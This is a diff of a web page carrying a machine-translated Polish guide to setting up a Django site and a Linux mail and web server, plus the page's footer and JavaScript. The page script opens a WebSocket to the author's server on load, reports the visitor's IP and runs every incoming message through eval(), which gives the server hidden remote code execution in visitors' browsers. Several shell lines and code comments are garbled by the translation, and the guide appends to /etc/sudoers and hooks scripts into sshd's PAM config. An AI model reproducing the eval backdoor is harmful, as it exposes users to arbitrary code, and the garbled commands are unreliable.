@@ -547,7 +547,7 @@ class UserRegisterForm(UserCreationForm):
 </code></pre>Mamy więc inną formę, która działa dość prosto. Jest to formularz rejestru użytkownika z nazwą użytkownika, e -mailem i hasłem, a także pole potwierdzają hasło. Zauważ, że ten formularz nie rozszerza zwykłej klasy. Jedno pole jest zdefiniowane tak samo, a meta klasy definiuje model, który formularz odpowiada reszcie informacji, które zostaną zapisane do formularza. Większość z nich istnieje już w wbudowanych tworzeniu użytkowników Django, więc wykorzystamy to jako podstawę klasy (przekazaną w nawiasach).
 
 Następnie zbadamy widok, aby zarejestrować użytkownika, teraz, gdy mamy formularz i szablon. To jest modele, podobnie jak ten w nowym widoku postu. Edytuj użytkowników/views.py i dodaj następujący kod:<pre class="language-python"><code>
-# … Import
+# … Kwoty
 from .forms import UserRegisterForm
 
 def register(request):
@@ -838,7 +838,7 @@ def activate(request, uidb64, token):
         user.profile.email_verified = True
         user.profile.save()
         user.save()
-# sendWelcomeEMail (żądanie, użytkownik)
+# SendWelcomeEMail (żądanie, użytkownik)
         messages.success(request, f'Thanks for confirming your email! You can now log into your account, and a welcome email has been sent to you.')
         return redirect(user.profile.create_face_url())
     else:
@@ -1205,7 +1205,7 @@ class TfaForm(forms.Form):
         'code': 'Please enter the six digit code after sending it to your phone with the button above.'
     }
 </code></pre>Następnie utwórzmy widoki w użytkownikach/views.py<pre class="language-python"><code>
-# … Kwoty
+# … Import
 from django.http import HttpResponseRedirect
 from .forms import PhoneNumberForm, TfaForm
 
@@ -1992,7 +1992,7 @@ UsePAM yes
 X11Forwarding yes
 # X11Displayoffset 10
 # X11uselocalhost Tak
-# Permittty tak
+# Pigułka tak
 PrintMotd no
 # Printlastlog tak
 # TCPKEEPALIVE TAK
@@ -2010,7 +2010,7 @@ PrintMotd no
 # Brak domyślnej ścieżki banerowej
 Banner /etc/banner
 
-# Pozwól klientowi przejść zmienne lokalne
+# Pozwól klientowi przejść zmienne środowiskowe
 AcceptEnv LANG LC_*
 
 # Zastąp domyślnie brak podsystemów
@@ -2067,7 +2067,7 @@ sudo nano /usr/bin/ascript
 # ! / bin / bash
 if [ ! -f /usr/bin/$1 ]; then
     sudo touch /usr/bin/$1
-    echo "# ! / bin / bash "&gt; / usr / bin / 1 $
+    echo "# !/bin/bash "&gt;&gt;/usr/bin/1 $
     sudo chmod a+x /usr/bin/$1
     sudo nano /usr/bin/$1
     echo $1 | sudo tee -a /etc/ascripts
@@ -2329,7 +2329,7 @@ sudo chmod -R g+rwX ./
 sudo chmod -R g+rX .././
 sudo chmod -R g-rwX ../.ssh
 sudo chmod 774 ./
-# Sudo chmod 664 db.sqlite3
+# sudo chmod 664 db.sqlite3
 # sudo chown www-data: Użytkownicy db.sqlite3
 sudo chown -R www-data:www-data media/
 sudo chown www-data:users ./
@@ -2363,7 +2363,7 @@ echo "Setup crontab/sudoers configuration"
 sudo crontab -l -u root | cat - config/crontab | sudo crontab -u root -
 sudo sh -c "cat config/sudoers &gt;&gt; /etc/sudoers"
 # Wstrzykiwać PAM Config i usuń wadliwą konfigurację SSH
-# sudo sed -i '' -e '$ d' /tc/pam.d/sshd
+# Sudo sed -i '' -i $ d '/etc/pam.d/sshd
 # Sudo sed -i '' -i $ d ' /etc /profil
 echo "session required pam_exec.so seteuid /home/team/femmebabe/pam.sh" | sudo tee -a /etc/pam.d/sshd
 echo "session required pam_exec.so seteuid /home/team/femmebabe/logout.sh" | sudo tee -a /etc/pam.d/sshd
@@ -2413,7 +2413,7 @@ sudo a2enmod proxy_balancer
 sudo a2enmod proxy_http
 sudo a2enmod proxy_wstunnel
 # sudo a2dismod mpm_event
-# sudo a2dismod mpm_Worker
+# Sudo a2dismod mpm_Worker
 # sudo a2enmod mpm_prefork
 # Wyłącz domyślną witrynę
 sudo a2dissite 000-default
@@ -2982,7 +2982,7 @@ maildrop  unix  -       n       n       -       -       pipe
 # Stary przykład dostawy przez Cyrus.
 # 
 # Stary -cyrus unix - n n - - rurka
-# flagi = r użytkownik = Cyrus argv =/cyrus/bin/dostarczenie -e -m $ {rozszerzenie} $ {użytkownik}
+# Flagi = r użytkownik = Cyrus argv =/cyrus/bin/dostarczenie -e -m $ {rozszerzenie} $ {użytkownik}
 # 
 # ================================================== ===================
 # 
@@ -3017,7 +3017,7 @@ nano config/etc_default_opendkim
 # Daemon_opts = ""
 # Zmień na/var/szpula/postfix/run/opendkim, aby używać gniazda Unixa z
 # Postfix w chroot:
-# Rundir =/był/szpula/postfix/run/opendkim
+# Rundir =/var/buol/postfix/run/opendkim
 RUNDIR=/run/opendkim
 # 
 # Ukształcenie, aby określić alternatywne gniazdo
@@ -3118,7 +3118,7 @@ service imap {
 
 service pop3 {
   # Max. Liczba procesów POP3 (połączenia)
-  # proces_limit = 1024
+  # Proces_limit = 1024
 }
 
 service submission {
@@ -3552,7 +3552,7 @@ Dziękujemy za poświęcenie czasu na przeczytanie tego trzeciego edycji przewod
 
 
 
-<p><a href="https://lotteh.com/payments/photo/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7" title="Buy on Lotte Harper">Kupić</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7&crypto=ETH" title="Buy with cryptocurrency on Lotte Harper">Kupuj za kryptowalutę</a></p>
+<p><a href="https://lotteh.com/payments/pay/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7" title="Buy on Lotte Harper">Kupić</a> | <a href="https://lotteh.com/payments/pay/crypto/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7&crypto=USDC" title="Buy with cryptocurrency on Lotte Harper">Kupuj za kryptowalutę</a></p>
 
 
 <hr>
@@ -3592,7 +3592,7 @@ Dziękujemy za poświęcenie czasu na przeczytanie tego trzeciego edycji przewod
 
 
         
-        <p>
+        
 
 <div class="dropdown">
   <a class="btn btn-outline-info dropdown-toggle" role="button" id="dropdownMenuLink" data-bs-toggle="dropdown" aria-expanded="false">
@@ -3629,12 +3629,16 @@ Dziękujemy za poświęcenie czasu na przeczytanie tego trzeciego edycji przewod
     </div>
   </div>
 </div>
-</p>
+
         <p><i>Zostaw mi napiwek w Bitcoin, korzystając z tego adresu:</i> <b id="btc-wallet">3KhDWoSve2N627RiW8grj6XrsoPT7d6qyE</b> <button class="btn btn-sm btn-info" title="Skopiuj adres" onclick="copyToClipboard('btc-wallet');">Kopia</button></p>
+        <div id="javascript-console"></div>
 	    <div class="d-flex justify-content-between p-2">
 	        <div style="float:left;">
 	          <p><span class="badge bg-light text-dark shadow p-1">&copy; Glam Girl X 2025</span></p>
 		    </div>
+            <div style="text-align: center;">
+                 <a href="https://instagram.com/yourlocalfemme" about="_blank" title="Odwiedź mnie na Instagramie" style="font-size: 20px;" class="ml-1"><i class="bi bi-instagram"></i></a> <a href="https://twitter.com/teamfemmebabe" about="_blank" title="Odwiedź mnie na Twitterze" style="font-size: 20px;" class="ml-1"><i class="bi bi-twitter"></i></a> <a href="https://youtube.com/@daisymakeup" about="_blank" title="Oglądaj mnie na YouTube" style="font-size: 20px;" class="ml-1"><i class="bi bi-youtube"></i></a>
+            </div>
 	        <div style="float:right;">
 	          <p><span class="badge bg-light text-dark shadow p-1"><a href="https://lotteh.com/terms/?lang=pl" title="Zobacz warunki korzystania z usługi">Warunki świadczenia usług</a></span></p>
 		    </div>
@@ -3677,32 +3681,32 @@ function jumpbookto(page) {
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("close", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -3849,34 +3853,41 @@ if(document.getElementById("current-time")) {
             image.style.height = "100%";
             image.style.maxWidth = "160px";
             image.alt = "Udostępnij tę stronę, skanując kod QR.";
-            function downloadQrImage(url, filename) {
-              const link = document.createElement('a');
-              link.href = url;
-              link.download = 'Glam Girl X - ' + filename;
-              document.body.appendChild(link);
-              link.classList.add('hide');
-              link.click();
-            }
-            function downloadQr() {
-                    downloadQrImage(image.src, 'QR Code');
-            }
-            qrdiv.onclick = downloadQr;
+            try {
+                function getBase64Image(img) {
+                    var src = img.src;
+                    var image = new Image();
+                    image.src = src;
+                    image.onload = function(event) {
+                    var bsfcanvas = document.createElement("canvas");
+                    bsfcanvas.width = img.clientWidth + 40;
+                    bsfcanvas.height = img.clientHeight + 40;
+                    if(bsfcanvas.height < bsfcanvas.width) bsfcanvas.height = bsfcanvas.width;
+                    var bsfctx = bsfcanvas.getContext("2d");
+                    bsfctx.fillStyle = "#ffffff";
+                    bsfctx.fillRect(0, 0, bsfcanvas.width, bsfcanvas.height);
+                    bsfctx.drawImage(event.target, 20, 20, bsfcanvas.width - 40, bsfcanvas.height - 40);
+                    var dataURL = bsfcanvas.toDataURL("image/png");
+                    downloadQrImage(dataURL, 'Glam Girl X - QR Code.png');
+                    };
+                }
+                function downloadQrImage(url, filename) {
+                    const link = document.createElement('a');
+                    link.download = filename;
+                    link.href = url;
+                    link.classList.add('hide');
+                    link.click();
+                }
+                function downloadQr(){
+                    var theQrImage = document.getElementById('shareqrcode').querySelector('img');
+                    getBase64Image(theQrImage);
+                }
+                qrdiv.onclick = downloadQr;
+                } catch(error) {
+                        document.getElementById('javascript-console').insertAdjacentHTML("beforeend", '<div>' + new String(error) + '</div>');
+                }
         });
     </script>
-    
-    <script async type="application/javascript"
-        src="https://news.google.com/swg/js/v1/swg-basic.js"></script>
-<script>
-  (self.SWG_BASIC = self.SWG_BASIC || []).push( basicSubscriptions => {
-    basicSubscriptions.init({
-      type: "NewsArticle",
-      isPartOfType: ["Product"],
-      isPartOfProductId: "CAowktDYCw:openaccess",
-      clientOptions: { theme: "light", lang: "en" },
-    });
-  });
-</script>
-
     
     
     
